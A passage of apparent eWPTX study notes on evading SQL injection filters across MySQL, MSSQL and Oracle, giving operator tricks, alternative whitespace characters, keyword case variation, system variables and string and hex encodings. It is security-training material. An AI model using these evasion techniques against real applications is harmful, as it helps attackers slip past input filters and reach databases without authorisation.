+</code></pre><p id="d60a6ff4-fdd7-4816-b58f-e51f28b87b4c" class="">Comparison Operators:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="33fed94b-5e90-439f-98de-01343b1183c5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html
+
+id=GREATEST(0,1)
+id=COALESCE(NULL,1)
+id=ISNULL(1/0)
+id=LEAST(2,1)
+</code></pre><p id="ee96b83f-e1b0-4026-909b-a4e912d0957f" class="">In MSSQL we cannot use two equal signs concatenated:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1e2f2216-2bef-4092-a9dc-a75cbb8fe180" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">id=1
+id=-+-+1
+id=-+-+-+-+-+-+1
+id=-+-+-+-+-+-+-+-+-+1*-+-+-+-+-+-+-+-+-+1
+</code></pre><p id="2300f620-17ad-4d86-8357-44ca69be6b6f" class="">BitWise Operators:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="82e59365-b082-4e4e-ac52-4677e7e9c945" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://msdn.microsoft.com/en-us/library/ms176122.aspx
+
+We can only manipulate using:
+&amp;=(AND)
+|=(OR)
+^ = (XOR)
+</code></pre><p id="23dffc15-e0aa-4c40-bab7-7b4e5bfdf6fa" class="">In MySQL there are other operator that we can leveraged For testing the whether or not some conditions are true</p><p id="a2fa582b-565a-4e19-bdc1-5a0ea2c6be3f" class="">→ http://dev.mysql.com/doc/refman/5.7/en/subqueries.html</p><p id="78fdf2d8-d99c-4ac6-b47b-ef63b681ff81" class="">In SQL Server, these are all grouped in one table:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="893e9a32-050c-4663-9036-dc77f8dc703c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://msdn.microsoft.com/en-us/library/ms189773.aspx
+However there are not short forms, so
+&amp;&amp;
+||
+etc... Are not valid in this DBMS
+</code></pre><h3 id="8650ca76-37f5-4140-8df0-2d7f1cdb6141" class=""><strong>Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#oracle"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="91d6bf8d-d987-4d8e-b85f-777942264e14" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name from exployees WHERE id=&#x27;MAGIC-HERE&#x27;
+</code></pre><p id="b25a95e8-0cf6-471a-8367-6e5a8af19e87" class="">Oracle is more restrictive</p><p id="f3000810-30b3-449d-b49c-09c88e397bf1" class="">To use arithmetic operators, we must create valid expression to avoid the <strong>missing expression erro</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="61636a62-4a5b-4fc4-92fe-d0abe45a18c6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">id=1
+id=-(-1)
+id=-(1)*-(1)
+</code></pre><p id="e972af48-c102-409a-a8bf-d6ac850f9ded" class="">To combine values, functions and operators into expressions, we must follow the list of Conditions mixed to Expression</p><p id="e2fa56ac-f9f5-481c-8590-9d3c41ca1735" class="">→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/conditions.htm#SQLRF005</p><p id="cf0342fa-8646-4f8e-813a-63326234273e" class="">→ https://docs.oracle.com/cd/B28359_01/server.111/b28286/expressions.htm#SQLRF004</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="44444811-c6a9-4793-891f-95e4b02ad3a4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name from employees where id=some(1)
+</code></pre><h2 id="f6cf5f94-6234-4f6d-8503-3bb578f61b1b" class=""><strong>Intermediary Characters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#intermediary-characters"></a></strong></h2><ul id="21b943c4-d8a0-498c-a161-f427a53ef686" class="bulleted-list"><li style="list-style-type:disc">Blank spaces are useful in separating functions, operators, declarations, and so forth, basically intermediary characters.</li></ul><ul id="b9490627-d167-43f1-a2ce-386d943b4545" class="bulleted-list"><li style="list-style-type:disc">However, there is non-common characters that can be user</li></ul><h3 id="dfc17137-e0bf-45b6-8fbe-3e331b6efd38" class=""><strong>MySQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mysql-1"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d7c55ffe-9e54-4e4c-8934-cab24320f633" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT[CHAR]name[CHAR]from[CHAR]employees
+</code></pre><p id="b6c24b4e-21ad-47ae-abc1-527b200cee6d" class="">Universal characters allowed as whitespaces:</p><table id="afb8a211-3779-4c9d-86ba-8b3ff0597195" class="simple-table"><tbody><tr id="70bb4f77-aa30-4a82-ae07-1e16b544c2b4"><td id="]|`Y" class="">Codepoint</td><td id="vgA?" class="">Character</td><td id="?jiT" class=""></td></tr><tr id="ffc714a1-3f3a-42ed-86d5-239d834c820b"><td id="]|`Y" class="">9</td><td id="vgA?" class="">U+0009</td><td id="?jiT" class="">= character tabulation</td></tr><tr id="3a602388-f4b9-4680-9ff2-2f42df20d988"><td id="]|`Y" class="">10</td><td id="vgA?" class="">U+000A</td><td id="?jiT" class="">= Life feed (LF)</td></tr><tr id="9ca1f900-326a-4394-94e0-8895be628b4f"><td id="]|`Y" class="">11</td><td id="vgA?" class="">U+000B</td><td id="?jiT" class="">= Line Tabulation</td></tr><tr id="5809bef9-2378-4bba-803c-31555e948474"><td id="]|`Y" class="">12</td><td id="vgA?" class="">U+000C</td><td id="?jiT" class="">= Form feed</td></tr><tr id="739f2879-b61f-42bf-b13f-b9149e3ff601"><td id="]|`Y" class="">13</td><td id="vgA?" class="">U+000D</td><td id="?jiT" class="">= Carriage return (CR)</td></tr><tr id="be6bc9f0-c44f-4cd2-9e62-e84544cc29d5"><td id="]|`Y" class="">32</td><td id="vgA?" class="">U+0020</td><td id="?jiT" class="">= Space</td></tr></tbody></table><h3 id="41c79b36-83ec-44b1-938d-70a5d3b8d447" class=""><strong>MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mssql"></a></strong></h3><p id="b44d79a1-7020-491a-9630-dd8849e91932" class="">The list of Universal characters allowed as a whitespace are large. Essentially, all the ASCII Control Characters, the space and the no-break space are allowed.</p><table id="6f9ab5ab-0b13-41da-a340-f2e5312ff2f5" class="simple-table"><tbody><tr id="15041db9-8139-4fbb-9ca2-189ea3e36c65"><td id="IpB:" class="">Codepoint</td><td id="[_C{" class="">Character</td><td id="lFW[" class=""></td></tr><tr id="7880f7dd-9b5e-4a54-934b-cb4371cb63e5"><td id="IpB:" class="">160</td><td id="[_C{" class="">U+00A0</td><td id="lFW[" class="">= No-break space</td></tr></tbody></table><h3 id="fde5c573-6b4f-48b2-8846-50e2a8b48fe9" class=""><strong>Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#oracle-1"></a></strong></h3><p id="bbafa6d4-fb8d-4369-998f-9e52b0307c5c" class="">There are 7 characters in total</p><p id="d9e920a4-990e-44c5-90b2-f10c1d09e2b3" class="">All the mysql table + the NULL char:</p><table id="28809684-8aa8-40bf-b48e-d29e0e0720b0" class="simple-table"><tbody><tr id="3ad52f61-47f3-4d04-991e-4f77a94d3a55"><td id="hscq" class="">Codepoint</td><td id="jglF" class="">Character</td><td id="W~Sy" class=""></td></tr><tr id="f12ccc72-6597-44db-90c4-7f209194a32e"><td id="hscq" class="">0</td><td id="jglF" class="">U+0000</td><td id="W~Sy" class="">// NULL</td></tr></tbody></table><h2 id="0f85725e-7e9c-4d2a-9cfc-ce06aea9156d" class=""><strong>Non Universal characters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#non-universal-characters"></a></strong></h2><h3 id="9c88d348-7e41-4d87-8318-85d43cce284b" class=""><strong>Mysql / MSSQL / Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mysql--mssql--oracle"></a></strong></h3><p id="bfc5cb23-0cf5-44c5-8cf0-f7b8e444e6e5" class="">Plus Sign (+)</p><p id="a072f7c8-9d73-4c43-b1cd-170d00c7ebaa" class="">In all the DBMS we can use the (+) to separate almost all the keywords except <strong>FROM</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68dcfda3-0e67-49bd-8fb5-343e133386d7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT+name FROM exployees WHERE+id=1 AND+name LIKE+&#x27;J%&#x27;
+</code></pre><p id="ea35a7d9-bedd-4218-a3a3-027354e27532" class="">In all DMBS depending on the context ,we can also use</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="efb7c4f1-b9e8-4f9a-990a-7ded943e839b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Parenthesis ()
+Operators
+Quotes
+and of course the C-Style comments /**/
+</code></pre><h2 id="e334c9ea-2b38-4dfc-8b61-f05c14fb19d1" class=""><strong>Constants and Variables</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#constants-and-variables"></a></strong></h2><ul id="07f01c3d-ec61-48fe-9905-94f7b2b7d28f" class="bulleted-list"><li style="list-style-type:disc">Constants (AKA Reserved Words)</li></ul><ul id="90421b58-a7e1-4321-ac1a-a7446bca7b68" class="bulleted-list"><li style="list-style-type:disc">Knowing the SQL keywords is a must</li></ul><ul id="d282a5da-ce25-447d-8f06-97af1fa6fb20" class="bulleted-list"><li style="list-style-type:disc">System Variables also can be very useful</li></ul><h3 id="05414dfd-934c-4135-a46b-03663a19ea44" class=""><strong>MySQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mysql-2"></a></strong></h3><p id="c9010ac6-d671-41df-8d33-a78799dbcef9" class="">The only way to obfuscate keywords is by manipulating upper/lower case variations like:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f938f202-4f89-4d49-ba21-cd999e31867f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sELeCt
+SELect
+etc
+</code></pre><p id="96b4f17b-248a-4540-9202-fe33de2d4979" class="">System Variables</p><p id="2fdfbf85-8059-4fdf-be4a-372999c5bfd3" class="">→ http://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html</p><p id="5b20c8cf-207a-400e-8b30-9fb746b39a6d" class="">We can use the statement:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8d11ea21-64d3-4390-9c31-25efc3a3cc48" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SHOW VARIABLES
+</code></pre><p id="59a7ac98-8cad-407c-8302-83c9dc9673c5" class="">The list is large, if u want to retrieve a specific value, just add @@ before the variable name:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="51695d40-74b1-4716-bb50-08372a012b96" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">@@version
+</code></pre><p id="709fea7d-5b0e-434c-8ded-7c408b928d86" class="">User Variables:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3284315b-6f11-46ab-80bd-5fa71269d714" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SET @myvar={expression}
+SET @myvar:={expression}
+</code></pre><h3 id="27645a8c-eedc-473d-82c6-0e268194e1ef" class=""><strong>MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mssql-1"></a></strong></h3><p id="d8af69b3-47d7-4574-b7c1-38d865869d10" class="">Keywords</p><p id="90a94e23-874a-4dbe-9a9b-7c688b03464d" class="">→ http://msdn.microsoft.com/en-us/library/ms189822.aspx</p><p id="8c2492b7-7fb0-48be-9e77-f315973af8f3" class="">This list displays not only SQL reserved words, but also system functions</p><ul id="ee02ba9d-71cb-4973-a689-aebc80952dae" class="bulleted-list"><li style="list-style-type:disc">Info about configuration and more is organized as Built-in Functions</li></ul><p id="abfc2497-5d3d-4e2d-a39a-85ceec4dadbc" class="">→ http://technet.microsoft.com/en-us/library/ms174318(v=sql.110).aspx</p><p id="a1c185e4-020b-432f-a887-55eff52c3d46" class="">There are primarily four types of functions, closer to variable are <strong>Scalar Functions</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="299b3176-f4a4-4edb-a013-feda5100e485" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">@@version // its a Scalar function
+</code></pre><h3 id="21baec27-bf99-42b1-a493-6af2138aead3" class=""><strong>Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#oracle-2"></a></strong></h3><p id="10e23eb2-8a22-4680-8491-f43973c3f933" class="">Particular management of Words</p><p id="016f1b13-612e-453d-acea-72fd9d852cdd" class="">→ https://docs.oracle.com/cd/B10501_01/appdev.920/a42525/apb.htm</p><p id="005e0a5b-fa1f-40ca-aa82-0ed0c2506fdd" class="">There are both Reserved Words, the words that cannot be redefined, and Keywords, words always important but can be redefined by the user</p><p id="9a6ee9cf-6440-46a2-a8e6-e9d64c59b62e" class="">Example: we can create a table <strong>DATABASE</strong> cause the keyword is not Reserved:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bbf2a6d9-5d87-4372-a423-8bb333224b78" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">CREATE TABLE DATABASE (id number);
+</code></pre><h2 id="72570a9d-d7bd-464b-b6b2-034478a33ed7" class=""><strong>Strings</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#strings"></a></strong></h2><p id="82541f80-75d4-4451-9d3a-d4aa5a927d3a" class="">Lets see techniques that are helpful in the creation, manipulation and obfuscation of strings</p><h3 id="8ebc543f-9718-454f-93c0-d3f4e781bfcd" class=""><strong>Regular Notations</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#regular-notations"></a></strong></h3><h3 id="ac8d06e7-d79b-4839-bcae-e8c23c4193e1" class=""><strong>MYSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqlievasion/#mysql-3"></a></strong></h3><p id="604b056d-c559-4cb9-8177-ca50bf9db56a" class="">To define a string we can use:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="78257158-7e08-4c8d-a216-1d3356832a76" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">single quote  (&#x27;&#x27;)
+double quotes (&quot;&quot;)
+</code></pre><p id="d357d63e-4ea0-457e-bc6f-68cc306116f9" class="">To define string literals:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e5edb5f7-83c4-4dd4-9225-5fd1c17ed11e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">_latin1&#x27;string&#x27;
+</code></pre><p id="5a05093d-dd6f-4314-8e80-c759940ccc0c" class="">The character set that can be used has approximately 40 possible values and can use any of them preceded by an underscore character:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="294bf4ca-2ddb-477d-94c2-50573ffa68fe" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT _ascii&#x27;Break Me&#x27;
+</code></pre><p id="dc641336-817c-4705-9ded-39bd88334f1a" class="">U can use N’literal’ or n’niteral’ to create a string in the National character Set: http://dev.mysql.com/doc/refman/5.7/en/charset-national.html</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b098dfa0-2147-4430-a261-cd0da090d0dc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT N&#x27;mystring&#x27;
+</code></pre><p id="d5a1aeea-b83a-453d-8246-19d03cb955d9" class="">Hexadecimal</p><p id="a1af8072-13d5-40cf-a8a7-170654991dce" class="">→ https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c3261ac6-a806-423d-95e3-e7e04eef9387" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT X&#x27;4F485045&#x27;
+SELECT 0x4F485045
